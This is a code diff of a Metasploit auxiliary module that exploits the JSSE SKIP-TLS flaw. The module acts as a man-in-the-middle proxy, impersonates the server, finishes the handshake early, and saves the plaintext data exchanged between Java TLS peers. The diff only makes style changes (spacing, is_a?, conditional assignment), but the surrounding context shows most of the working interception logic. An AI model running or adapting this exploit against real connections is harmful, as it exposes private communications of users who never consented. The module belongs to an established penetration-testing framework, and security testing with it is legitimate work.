@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,13 +8,12 @@ require 'msf/core'
 require 'openssl'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
 
   def initialize
     super(
-      'Name'        => 'Java Secure Socket Extension (JSSE) SKIP-TLS MITM Proxy',
-      'Description'    => %q{
+      'Name' => 'Java Secure Socket Extension (JSSE) SKIP-TLS MITM Proxy',
+      'Description' => %q{
         This module exploits an incomplete internal state distinction in Java Secure
         Socket Extension (JSSE) by impersonating the server and finishing the
         handshake before the peers have authenticated themselves and instantiated
@@ -24,12 +24,12 @@ class MetasploitModule < Msf::Auxiliary
         plaintext application data transmitted between the peers to be saved. This
         module requires an active man-in-the-middle attack.
       },
-      'Author'      =>
+      'Author' =>
         [
           'Ramon de C Valle'
         ],
       'License' => MSF_LICENSE,
-      'Actions'     =>
+      'Actions' =>
         [
           [ 'Service' ]
         ],
@@ -57,7 +57,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('PORT', [ true, 'The server port', 443]),
         OptString.new('SRVHOST', [ true, 'The proxy address', '0.0.0.0']),
         OptString.new('SRVPORT', [ true, 'The proxy port', 443])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def cleanup
@@ -65,8 +66,8 @@ class MetasploitModule < Msf::Auxiliary
     return unless @proxy
 
     begin
-      @proxy.deref if @proxy.kind_of?(Rex::Service)
-      if @proxy.kind_of?(Rex::Socket)
+      @proxy.deref if @proxy.is_a?(Rex::Service)
+      if @proxy.is_a?(Rex::Socket)
         @proxy.close
         @proxy.stop
       end
@@ -138,7 +139,8 @@ class MetasploitModule < Msf::Auxiliary
             {
               'Msf'        => framework,
               'MsfExploit' => self
-            })
+            }
+        )
         add_socket(fake_server)
 
         print_status('Connected to %s:%d' % [fake_host, fake_port])
@@ -150,7 +152,8 @@ class MetasploitModule < Msf::Auxiliary
             {
               'Msf'        => framework,
               'MsfExploit' => self
-            })
+            }
+        )
         add_socket(server)
 
         print_status('Connected to %s:%d' % [host, port])
@@ -158,7 +161,7 @@ class MetasploitModule < Msf::Auxiliary
         version = nil
         begin
           loop do
-            readable, _, _ = Rex::ThreadSafe.select([client, server])
+            readable, = Rex::ThreadSafe.select([client, server])
 
             readable.each do |r|
               case r
@@ -175,7 +178,7 @@ class MetasploitModule < Msf::Auxiliary
                 while fragment_length > 0
                   partial_fragment = r.get_once(fragment_length)
                   fragment << partial_fragment
-                  fragment_length = fragment_length - partial_fragment.length
+                  fragment_length -= partial_fragment.length
                 end
               end
 
@@ -218,13 +221,13 @@ class MetasploitModule < Msf::Auxiliary
 
               case r
               when client
-                if finished_sent
-                  # The server (i.e., fake_server) is an SSL socket
-                  count = server.put(fragment)
-                else
-                  # The server isn't an SSL socket
-                  count = server.put(header + fragment)
-                end
+                count = if finished_sent
+                          # The server (i.e., fake_server) is an SSL socket
+                          server.put(fragment)
+                        else
+                          # The server isn't an SSL socket
+                          server.put(header + fragment)
+                        end
 
                 print_status('%d bytes sent' % [count])
 
@@ -269,5 +272,4 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
   end
-
 end
